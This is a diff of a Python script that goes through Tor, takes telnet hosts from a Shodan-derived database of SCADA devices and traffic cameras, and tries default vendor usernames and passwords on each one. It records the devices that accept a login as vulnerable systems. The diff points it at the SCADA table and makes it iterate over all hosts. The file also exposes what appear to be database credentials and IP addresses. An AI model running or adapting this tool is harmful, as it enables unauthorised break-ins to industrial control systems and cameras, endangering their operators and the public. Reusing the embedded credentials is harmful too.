@@ -7,7 +7,7 @@ import MySQLdb
 import urllib
 import json
 
-db = MySQLdb.connect("128.196.27.147","ShodanTeam","Sh0d@n7e", "shodan")
+db = MySQLdb.connect("128.196.27.147","ShodanTeam","Sh0d@n7e")
 
 def connectTor():
     socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, "127.0.0.1", 9050, True)
@@ -19,8 +19,8 @@ def connectTor():
     cursor = db.cursor()
 
     try:
-        sql = "SELECT * FROM allshodan  \
-               WHERE (nicknm = 'traffic cam') AND portnum = 23"
+        sql = "SELECT * FROM shodan.sy_sfs_scadashodan  \
+               WHERE portnum = 23"
 
             # % (keyword, keyword, keyword, keyword, keyword)
         try:
@@ -42,7 +42,7 @@ def connectTor():
                     ipaddr = ip
                     #print('connected to device, no login')
 
-                    sql = "SELECT * FROM passworddb \
+                    sql = "SELECT * FROM passworddb.scada \
                            WHERE vendor = 'traffic cam'"
 
                     try:
@@ -60,9 +60,8 @@ def connectTor():
                             user = UserName
                             password = Password
 
-                            #tn = telnetlib.Telnet(HOST,'',2)
-                            tn = telnetlib.Telnet('64.59.176.38','',2)
-                            #print "tel success"
+                            tn = telnetlib.Telnet(HOST,'',2)
+                            print "tel success"
 
                             try:
                                 line = tn.read_until("A$tring+hatWouldN0tExist", 3)
@@ -75,10 +74,10 @@ def connectTor():
                                     try:
                                         #print passID
                                         #Username is also sometimes a option sometimes there is only a password
-                                        tn.read_until("login: ")
+                                        tn.read_until("login: ") or tn.read_until("user: ")
                                         try:
                                             tn.write(user + "\n")
-                                            #print "user success"
+                                            print "user success"
                                         except:
                                             print "fail user write"
                                             tn.close()
@@ -86,7 +85,7 @@ def connectTor():
                                             tn.read_until("Password: ")
                                             try:
                                                 tn.write(password + "\n")
-                                                #print "pass success"
+                                                print "pass success"
                                             except:
                                                 print "pass failure"
                                                 tn.close()
@@ -97,10 +96,10 @@ def connectTor():
                                             strline = strline.replace('\'','')
                                             line = strline
 
-                                            if not (("user" in line)or("username" in line)or("login" in line)):
+                                            if not (("user" in line)or("username" in line)or("login" in line)or("password" in line)):
                                                 try:
                                                     #print passID
-                                                    sql = "INSERT INTO VulnerableSystems(ipaddr, passwordid, notes, openport) \
+                                                    sql = "INSERT INTO vulnerablesystems.telnetvuln(ipaddr, passwordid, notes, openport) \
                                                                VALUES ('%s', '%s', '%s', '%s')" % (ipaddr, passID, line, '')
                                                     tn.close()
                                                 except:
@@ -137,7 +136,7 @@ def connectTor():
                                     print "No known login needed"
                                     try:
                                         #print passID
-                                        sql = "INSERT INTO VulnerableSystems(ipaddr, passwordid, notes, openport) \
+                                        sql = "INSERT INTO vulnerablesystems.telnetvuln(ipaddr, passwordid, notes, openport) \
                                                    VALUES ('%s', '%s', '%s', '%s')" % (ipaddr, '5002', line, 'no login needed')
                                         tn.close()
                                     except:
